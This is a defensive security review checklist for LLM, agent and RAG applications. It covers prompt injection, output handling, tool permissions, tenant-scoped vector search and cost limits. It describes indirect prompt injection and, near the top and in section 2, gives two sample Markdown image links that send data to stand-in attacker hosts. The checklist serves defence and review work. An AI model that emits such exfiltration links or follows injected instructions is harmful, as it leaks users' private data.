# LLM, Agentic AI, and RAG Security Review

Apply only if the application calls a language model, embedding API, or AI agent framework.

## Foundational AI security principles
- **Simon Willison's "Lethal Trifecta":** An AI integration becomes critically exploitable whenever a single agent/context combines:
  1. **Access to private data** (database rows, internal docs, user emails/records),
  2. **Exposure to untrusted input** (uploaded files, web pages, user-submitted text, external tickets), and
  3. **An exfiltration or side-effect channel** (rendering Markdown images `![x](https://attacker.tld/?leak=...)`, clickable links, outbound HTTP/webhook tools, email/message sending, or database write tools).
- **OWASP Top 10 for LLM Applications:** Prompt Injection (`LLM01`), Sensitive Information Disclosure (`LLM02`), Supply Chain (`LLM03`), Improper Output Handling (`LLM05`), Excessive Agency (`LLM06`), System Prompt Leakage (`LLM07`), Vector and Embedding Weaknesses (`LLM08`), and Unbounded Consumption (`LLM10`).
- **Privilege Separation (CaMeL / Dual-LLM pattern):** Never treat an LLM as a security boundary. Enforce authentication, tenant filtering, and tool authorization deterministically in application code outside the prompt.

## 1. Data exposure and privacy governance
- What data is transmitted to external model or embedding providers (PII, CNICs, payroll, proprietary formulas, customer lists)? Verify zero-data-retention (ZDR) / enterprise training opt-out configurations where sensitive data is processed.
- Prompts, completions, and embeddings logged to console, analytics, or third-party observability tools without PII redaction.
- System prompts containing hardcoded API keys, internal URLs, database credentials, or secret business rules (violating `LLM07: System Prompt Leakage`).

## 2. Direct & indirect prompt injection (`LLM01`) and output handling (`LLM05`)
- **Indirect prompt injection:** Untrusted external content (uploaded PDFs/CSVs, scraped web pages, support tickets, database fields authored by other users) concatenated into prompts without structural delimiters or privilege separation.
- **Improper output handling:**
  - Model output passed into SQL queries (`Text-to-SQL` executed on a read-write DB connection or without tenant-scoped views/RLS), `eval`, shell commands, or file paths.
  - Model output rendered via `dangerouslySetInnerHTML` or unsanitized Markdown (enabling stored XSS or **Markdown image exfiltration** `![](https://evil.example/steal?data=...)` without a strict CSP `img-src`).

## 3. Agentic tool permissions and Excessive Agency (`LLM06`)
- **Least privilege on tools:** Tools exposed to the model are narrowly typed and scoped; flag generic `run_sql`, `exec_shell`, `http_request(url)`, or unrestricted CRUD tools.
- **Deterministic tenant binding:** User ID and `organization_id` are injected into tool handlers from the authenticated server session—**never** accepted as an LLM-supplied tool argument (`get_user_orders(user_id)` where the LLM picks `user_id`).
- **Human-in-the-loop (HITL) gates:** Any destructive, state-mutating, financial, or external-communication action (approving payouts, deleting records, sending emails/SMS) requires explicit user confirmation in the UI before execution.

## 4. RAG, vector store, and embedding isolation (`LLM08`)
- **Pre-filtering by tenant:** Vector similarity searches (`pgvector`, Pinecone, Qdrant, Chroma) enforce tenant/role metadata filters inside the database query—never retrieve global top-$K$ chunks and ask the prompt to "ignore chunks belonging to other users".
- Document ACL synchronization: when a source document's permissions change or it is deleted, verify its vector chunks are updated or purged.

## 5. Deterministic boundary and reliability
- **Code vs. LLM boundary:** Arithmetic, financial totals, tax calculations, slab lookups, and access control decisions are executed in deterministic code/tools—never estimated by token prediction.
- **Structured output validation:** JSON/structured responses are validated against a strict schema (`zod` / `pydantic`) with graceful fallback on parse failure, refusal, timeout, or provider `429`/`5xx`.
- Model IDs and versions pinned rather than floating aliases where output stability matters.

## 6. Unbounded consumption and Denial of Wallet (`LLM10`)
- Input character/token caps, `max_tokens` output bounds, and maximum agent tool-call loop iterations (`maxSteps` / recursion limit) enforced on every call.
- Per-user and per-tenant rate limits, daily token budgets, and provider billing alerts configured.

## 7. Evaluation and drift monitoring
- Representative evaluation dataset (golden prompts + adversarial injection cases) used to test prompt or model changes before deployment.
